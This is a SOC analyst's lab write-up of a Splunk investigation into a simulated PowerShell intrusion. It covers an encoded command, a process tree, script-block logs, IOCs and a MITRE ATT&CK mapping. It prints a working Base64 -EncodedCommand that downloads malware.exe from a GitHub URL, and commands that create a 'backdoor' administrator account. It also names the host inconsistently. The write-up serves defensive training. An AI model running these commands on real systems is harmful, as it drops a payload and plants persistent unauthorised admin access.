## Summary
An attacker used PowerShell to compromise workstation DESKTOP-8TU4818 at SecureCode infotec. Attackers used powershell encoding to avoid detection, downloaded malware from an external server, created a secret administrator account to maintain persistence, and then started mapping out the internal network. This was a structured and deliberate attack that went undetected because there was no PowerShell monitoring in place.   

## Scenario
It is Saturday Evening at SecureCode infotec. The SIEM fires an alert about suspicious PowerShell activity on workstation DESKTOP-8TU4818. The alert shows PowerShell was launched with unusual parameters from a process. As the analyst on duty the task is to investigate whether this is a legitimate administrator or an attacker using PowerShell to compromise the machine.

## Objective
Use Splunk to investigate suspicious PowerShell execution, identify all malicious commands and techniques used, understand the full scope of the attack, and produce a clear professional report of the findings.

## Tools Used
- Splunk Enterprise
- SPL (Search Processing Language)

## Background — Why Attackers Use PowerShell
PowerShell is built into every Windows machine and is trusted by the operating system. That is exactly why attackers love it. They do not need to bring any external tools because everything they need is already there. They can download files, run code, create accounts and explore the network all through PowerShell without triggering most antivirus tools.   

## Investigation Steps
## Alert
**Name:** Suspecious PowerShell execution.   
**Description** Encoded command execution detected.  
**Username** Administrator   
**Workstation** WKSTN-041   
**Time** 09/06/2026 12:39:43.372 PM   
**Process ID** 0x5dc  

## Alert Investigation
As usual, I’ll start the investigation with the information provided by the alert: the username, timestamp, workstation name, and the fact that a PowerShell execution was detected.  

Since we know this is a PowerShell execution, Windows Event ID 4688 (Process Creation) is a useful starting point. Event 4688 can provide the process name, parent process, user context, and, when command-line auditing is enabled, the complete command line used to launch PowerShell.    

We can use the username, workstation, and timestamp from the alert to narrow down the search in Splunk. This should reduce the amount of unrelated activity and help us quickly identify the process that generated the alert.  

**SPL query: ** `index=Winserver host="WKSTN-041" EventCode=4688 New_Process_ID=0x5dc Account_Name="Administrator" earliest="09/06/2026:12:39:00" latest="09/06/2026:12:40:30" | table _time host Account_Name New_Process_ID New_Process_Name Creator_Process_ID Creator_Process_Name Process_Command_Line`  

!(img)[]  

The Splunk query identified a PowerShell process executed by the `Administrator` account on workstation `WKSTN-041`. The process ID `0x5dc` corresponds to the process referenced in the alert. The process command line contains an encoded PowerShell command (`-EncodedCommand`)`, indicating an attempt to obfuscate the command being executed.    

**Key Findings**   
| IOC / Observable | Value | Description |
|---|---|---|
| **Timestamp** | 2026-09-06 12:39:43.372 | Time of suspicious process execution |
| **Host** | WKSTN-041 | Affected workstation |
| **Account** | Administrator | Account that executed the process |
| **Process ID** | 0x5dc (Decimal: `500) | PID of the suspicious PowerShell process |
| **Process Name** | powershell.exe | Windows PowerShell executable |
| **Process Path** | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | Path of the PowerShell executable |
| **Creator Process ID** | 0xf08 (Decimal: 3848) | PID of the parent/creator process |
| **Creator Process Name** | powershell.exe | Parent process |
| **Process_Command_Line** |  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBzAC0AYQBuAGoAZQBlAHYALwBzAG8AYwAtAHAAcgBvAGoAZQBjAHQAcwAvAGIAbABvAGIALwBtAGEAaQBuAC8AMAAzAC0ATQBhAGwAdwBhAHIAZQAtAEEAbgBhAGwAeQBzAGkAcwAvAGMAYQBzAGUALQAwADEALQBwAG8AdwBlAHIAcwBoAGUAbABsAC0AZAByAG8AcABwAGUAcgAvAHMAYQBtAHAAbABlAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAbQBhAGwAdwBhAHIAZQAuAGUAeABlACIA     

## Decode Command
**Lets Decode Executed Command Using cyberchef.io**    
The decoded PowerShell command revealed an attempt to download `malware.exe` from a GitHub repository and save it to `C:\Windows\Temp\malware.exe`. The use of `-EncodedCommand`provided an additional layer of obfuscation.   

!(img)[]  

Actual Command executed was `Invoke-WebRequest -Uri "https://github.com/s-anjeev/soc-projects/blob/main/03-Malware-Analysis/case-01-powershell-dropper/sample/malware.exe" -OutFile "C:\Windows\Temp\malware.exe"` this is confirmand by Event Code `4104` and `cyberchef`.

!(img)[]  

**Key Findings**  
- **PowerShell Web Request:** The command uses `Invoke-WebRequest` to retrieve a file from a remote GitHub repository.
- **Remote Source:** The requested resource is `malware.exe` hosted in a GitHub repository.
- **Payload:** The file being retrieved is an executable named `malware.exe`.
- **File Staging:** The downloaded executable is saved to: `C:\Windows\Temp\malware.exe`
- **Obfuscation:** The command was originally executed using PowerShell's `-EncodedCommand` parameter, which concealed the actual command from the initial process command line.


## Process Tree Analysis  
With the parent and child process IDs identified, we can now trace the execution chain to understand how the suspicious PowerShell activity originated.   

The process creation events were correlated using the `Creator Process ID` and `New Process ID` fields. The timestamps show the following execution sequence:  

| Time | Parent Process | Parent PID | Child Process | Child PID |
|---|---|---:|---|---:|
| `12:39:24.721` | `explorer.exe` | `0x1164` | `WindowsTerminal.exe` | `0xba0` |
| `12:39:27.462` | `WindowsTerminal.exe` | `0xba0` | `powershell.exe` | `0xf08` |
| `12:39:43.372` | `powershell.exe` | `0xf08` | `powershell.exe` | `0x5dc` |   

The process with PID 0x5dc is the process that triggered the suspicious PowerShell execution alert.   

## PowerShell Script Block Logging 
The next step was to investigate all PowerShell Script Block Logging events (Event ID 4104) generated within the relevant timeframe. The objective was to determine whether additional PowerShell commands were executed before or after the alert-triggering process.   

The following PowerShell commands were observed through Windows PowerShell Script Block Logging (Event ID 4104) during the investigation:  
| Timestamp | Command | Description |
|---|---|---|
| `2026-09-06 12:39:31.572` | `$Host` | Retrieves information about the current PowerShell host/session. |
| `2026-09-06 12:39:43.346` | `powershell.exe -EncodedCommand <Base64>` | Executes a Base64-encoded PowerShell command. |
| `2026-09-06 12:39:43.868` | `Invoke-WebRequest -Uri "https://github.com/..." -OutFile "C:\Windows\Temp\malware.exe"` | Downloads `malware.exe` from GitHub and saves it to the Windows Temp directory. |
| `2026-09-06 12:39:55.254` | `Get-Process` | Enumerates running processes for system reconnaissance. |
| `2026-09-06 12:40:07.149` | `Get-Service` | Enumerates Windows services. |
| `2026-09-06 12:40:21.631` | `Get-ExecutionPolicy` | Checks the current PowerShell execution policy. |
| `2026-09-06 12:40:35.868` | `Get-LocalUser` | Enumerates local user accounts. |
| `2026-09-06 12:40:49.417` | `Get-NetIPConfiguration` | Retrieves the system's network configuration. |
| `2026-09-06 12:41:02.175` | `New-LocalUser -Name "backdoor" ...; Add-LocalGroupMember -Group "Administrators" -Member "backdoor"` | Creates a local `backdoor` account and adds it to the Administrators group. |
| `2026-09-06 12:41:14.059` | `Get-LocalGroupMember -Group "Administrators"` | Checks the members of the Administrators group, potentially verifying the newly created account. |


## indicators of compromised  
The following indicators were identified during the investigation:  

| IOC Type | Indicator | Description |
|---|---|---|
| **URL** | `https://github.com/s-anjeev/soc-projects/blob/main/03-Malware-Analysis/case-01-powershell-dropper/sample/malware.exe` | Remote location used to retrieve the suspicious executable. |
| **File Name** | `malware.exe` | Executable downloaded from the remote repository. |
| **File Path** | `C:\Windows\Temp\malware.exe` | Local path where the downloaded executable was staged. |
| **PowerShell Parameter** | `-EncodedCommand` | Used to execute a Base64-encoded PowerShell command. |
| **PowerShell Command** | `Invoke-WebRequest` | Used to download the executable from the remote source. |
| **Local Account** | `backdoor` | Suspicious local account created during the activity. |
| **Account Group** | `Administrators` | The `backdoor` account was added to the local Administrators group. |
| **Process** | `powershell.exe` | PowerShell was used to execute the encoded command and subsequent reconnaissance commands. |  

## Attack Timeline
| Time | What happened |
|---|---|
| `2026-09-06 12:39:24.721` | `explorer.exe` launched `WindowsTerminal.exe` (PID `0xba0`). |
| `2026-09-06 12:39:27.462` | `WindowsTerminal.exe` launched `powershell.exe` (PID `0xf08`). |
| `2026-09-06 12:39:43.346` | PowerShell executed a Base64-encoded command using `-EncodedCommand`. |
| `2026-09-06 12:39:43.372` | The child PowerShell process (PID `0x5dc`) was created and triggered the suspicious PowerShell execution alert. |
| `2026-09-06 12:39:43.868` | Decoded command executed `Invoke-WebRequest` to download `malware.exe` to `C:\Windows\Temp\malware.exe`. |
| `2026-09-06 12:39:55.254` | `Get-Process` was executed to enumerate running processes. |
| `2026-09-06 12:40:07.149` | `Get-Service` was executed to enumerate Windows services. |
| `2026-09-06 12:40:21.631` | `Get-ExecutionPolicy` was executed to check the PowerShell execution policy. |
| `2026-09-06 12:40:35.868` | `Get-LocalUser` was executed to enumerate local user accounts. |
| `2026-09-06 12:40:49.417` | `Get-NetIPConfiguration` was executed to gather network configuration information. |
| `2026-09-06 12:41:02.175` | A local account named `backdoor` was created and added to the `Administrators` group. |
| `2026-09-06 12:41:14.059` | `Get-LocalGroupMember -Group "Administrators"` was executed to verify administrator group membership. |

## Summery  
The investigation identified a suspicious PowerShell execution on WKSTN-041 under the Administrator account. Process-tree analysis showed the execution chain from explorer.exe to WindowsTerminal.exe, followed by two PowerShell processes. The alert-triggering process (0x5dc) executed a Base64-encoded PowerShell command.   

After decoding the command and reviewing PowerShell Event ID 4104, it was confirmed that Invoke-WebRequest was used to download malware.exe and save it to C:\Windows\Temp\malware.exe. Further 4104 analysis revealed system and account discovery activity, followed by the creation of a backdoor local account and its addition to the Administrators group.   

Overall, the activity indicates a multi-stage attack involving PowerShell obfuscation, payload download, system reconnaissance, and creation of a privileged account for potential persistence.   


## MITRE ATT&CK Mapping
| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| **Execution** | PowerShell | **T1059.001** | `powershell.exe` was used to execute the encoded PowerShell command. |
| **Defense Evasion** | Obfuscated/Compressed Files and Information | **T1027** | The PowerShell command was Base64-encoded and executed using `-EncodedCommand`. |
| **Command and Control** | Ingress Tool Transfer | **T1105** | `Invoke-WebRequest` was used to download `malware.exe` from a remote GitHub repository. |
| **Discovery** | Process Discovery | **T1057** | `Get-Process` was executed to enumerate running processes. |
| **Discovery** | System Service Discovery | **T1007** | `Get-Service` was executed to enumerate Windows services. |
| **Discovery** | Account Discovery: Local Account | **T1087.001** | `Get-LocalUser` was used to enumerate local user accounts. |
| **Discovery** | System Network Configuration Discovery | **T1016** | `Get-NetIPConfiguration` was used to gather network configuration information. |
| **Persistence** | Create Account: Local Account | **T1136.001** | A local account named `backdoor` was created. |
| **Privilege Escalation** | Account Manipulation | **T1098** | The `backdoor` account was added to the `Administrators` group. |

## Recommended Actions
- Isolate WKSTN-041 from the network to prevent further malicious activity.
- Disable the compromised Administrator account and investigate potential credential compromise.
- Remove the backdoor account and revoke its membership in the Administrators group.
- Quarantine C:\Windows\Temp\malware.exe and collect its hash for further analysis.
- Check whether malware.exe was executed using Event ID 4688, Sysmon, and EDR telemetry.
- Review related authentication and account events such as 4624, 4720, and 4732.
- Hunt across other endpoints for the same file, hash, URL, PowerShell command, or backdoor account.